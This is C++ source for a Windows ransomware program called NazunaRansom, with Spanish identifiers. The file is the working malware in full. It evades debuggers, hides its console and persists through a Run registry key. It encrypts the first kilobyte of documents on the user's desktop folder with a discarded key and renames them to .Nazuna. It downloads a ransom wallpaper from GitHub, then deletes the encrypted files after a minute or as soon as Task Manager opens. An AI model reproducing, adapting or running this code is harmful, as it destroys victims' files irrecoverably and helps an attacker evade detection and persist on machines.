#include <windows.h>
#include <wincrypt.h>
#include <tchar.h>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>

#pragma comment(lib, "urlmon.lib")

using namespace std;

#define BUF_LEN 1024
#define KEY_TAM 16
#define USER_TAM 256
#define MUTEX _T("TeAmoNazuna") 
BOOL IsDebug = FALSE;

BOOL cifrar_archivos(LPCTSTR ruta_archivo);  
void recorrer_dir(LPCTSTR ruta_recorrer); 
void eliminar_archivos_cifrados(LPCTSTR ruta_recorrer);
DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam);
void persistencia();

BOOL cifrar_archivos(LPCTSTR ruta_archivo) {
    HCRYPTPROV hProv;
    HCRYPTKEY hkey;
    BYTE buf[BUF_LEN];
    static const BYTE KEY[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
    static const BYTE IV[KEY_TAM] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };

    ifstream archivo_original(ruta_archivo, ios::binary);
    if (!archivo_original.is_open()) {
        return FALSE;
    }

    archivo_original.read(reinterpret_cast<char*>(buf), BUF_LEN);
    DWORD bytes_leer = static_cast<DWORD>(archivo_original.gcount());
    archivo_original.close();

    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
            return FALSE;
        }
    }

    CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hkey);
    CryptSetKeyParam(hkey, KP_IV, IV, 0);
    CryptSetKeyParam(hkey, KP_MODE, reinterpret_cast<const BYTE*>(&mode), 0);
    CryptEncrypt(hkey, 0, TRUE, 0, buf, &bytes_leer, BUF_LEN);

    ofstream archivo_cifrado(ruta_archivo, ios::binary);

    if (!archivo_cifrado.is_open()) {
        CryptDestroyKey(hkey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    archivo_cifrado.write(reinterpret_cast<char*>(buf), bytes_leer);
    archivo_cifrado.close();

    CryptDestroyKey(hkey);
    CryptReleaseContext(hProv, 0);

    return TRUE;
}

void recorrer_dir(LPCTSTR ruta_recorrer) {
    vector<string> subdirectorios;

    string ruta_encriptar = string(ruta_recorrer) + _T("\\*");
    WIN32_FIND_DATA ruta_data;
    HANDLE hFind = FindFirstFile(ruta_encriptar.c_str(), &ruta_data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (_tcscmp(ruta_data.cFileName, _T(".")) != 0 && _tcscmp(ruta_data.cFileName, _T("..")) != 0) {
                    string subruta_recorrer = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                    subdirectorios.push_back(subruta_recorrer);
                }
            }
            else {
                const string ruta_archivo = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                const string extension = filesystem::path(ruta_archivo).extension().string();

                if (extension == _T(".txt") || extension == _T(".cpp") || extension == _T(".pdf") || extension == _T(".docx") || extension == _T(".xlsx")) {
                    if (cifrar_archivos(ruta_archivo.c_str())) {
                        const string newFileName = filesystem::path(ruta_archivo).replace_extension(_T(".Nazuna")).string();
                        filesystem::rename(ruta_archivo, newFileName);
                    }
                }
            }
        } while (FindNextFile(hFind, &ruta_data));

        FindClose(hFind);
    }

    for (const auto& subdir : subdirectorios) {
        recorrer_dir(subdir.c_str());
    }
}

void eliminar_archivos_cifrados(LPCTSTR ruta_recorrer) {
    WIN32_FIND_DATA ruta_data;
    HANDLE hFind = FindFirstFile((string(ruta_recorrer) + _T("\\*")).c_str(), &ruta_data);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (ruta_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (_tcscmp(ruta_data.cFileName, _T(".")) != 0 && _tcscmp(ruta_data.cFileName, _T("..")) != 0) {
                    eliminar_archivos_cifrados((string(ruta_recorrer) + _T("\\") + ruta_data.cFileName).c_str());
                }
            }
            else {
                const string ruta_archivo = string(ruta_recorrer) + _T("\\") + ruta_data.cFileName;
                const string extension = filesystem::path(ruta_archivo).extension().string();

                if (extension == _T(".Nazuna")) {
                    if (_tremove(ruta_archivo.c_str()) == 0) {

                    }
                }
            }
        } while (FindNextFile(hFind, &ruta_data));
        FindClose(hFind);
    }
}

void persistencia() {
    HKEY hKey;
    LPCTSTR lpSubKey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    LPCTSTR lpValueName = _T("NazunaRansom");
    TCHAR lpValue[MAX_PATH];

    string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + _T("\\Downloads")).string();
    string ruta_ransom = ruta_descarga + _T("\\NazunaRansom.exe");

    _tcscpy_s(lpValue, MAX_PATH, ruta_ransom.c_str());

    if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (BYTE*)lpValue, (_tcslen(lpValue) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS) {
            _tprintf(_T("Si funciona\n"));
        }
        RegCloseKey(hKey);
    }
}

void cambiar_fondo() {
    TCHAR username[USER_TAM];

    DWORD username_tam = USER_TAM;

    GetUserName(username, &username_tam);
    const char* url = "https://raw.githubusercontent.com/ic4rta/NazunaRansom/main/Nazuna_Ransom_Fondo.jpg";

    string destino_guardar = _T("C:\\Users\\");
    destino_guardar += username;
    destino_guardar += _T("\\Downloads\\Nazuna_Ransom_Fondo.jpg");

    LPCTSTR lpcstr_destino = destino_guardar.c_str();

    URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
}

DWORD WINAPI eliminar_archivos_routine(LPVOID lpParam) {
    LPCTSTR ruta_recorrer = static_cast<LPCTSTR>(lpParam);
    this_thread::sleep_for(chrono::minutes(1));
    eliminar_archivos_cifrados(ruta_recorrer);
    return 0;
}

int main() {
    HANDLE mutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, MUTEX);
    if (mutex != NULL) {
        CloseHandle(mutex);
        exit(-1);
    }
    else {
        mutex = CreateMutex(NULL, TRUE, MUTEX);
        if (mutex == NULL) {
            DWORD error = GetLastError();
            if (error == ERROR_ALREADY_EXISTS) {
                exit(-1);
            }
        }
        else {
            if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &IsDebug)) {
                if (IsDebug) {
                    exit(-1);
                }
                else {
                    HWND ventana_cmd = GetConsoleWindow();
                    ShowWindow(ventana_cmd, SW_HIDE);

                    persistencia();

                    string ruta = filesystem::path(string(getenv("USERPROFILE")) + _T("\\OneDrive\\Escritorio")).string();
                    recorrer_dir(ruta.c_str());
                    cambiar_fondo();

                    HANDLE hThread = CreateThread(NULL, 0, eliminar_archivos_routine, (LPVOID)ruta.c_str(), 0, NULL);
                    if (hThread != NULL) {
                        while (true) {
                            HWND taskManagerWnd = FindWindowA("TaskManagerWindow", nullptr);
                            if (taskManagerWnd != nullptr) {
                                eliminar_archivos_cifrados(ruta.c_str());
                                break;
                            }
                            this_thread::sleep_for(chrono::seconds(1));
                        }
                        CloseHandle(hThread);
                    }
                    while (true) { }
                }
            }
        }
    }
    return 0;
}
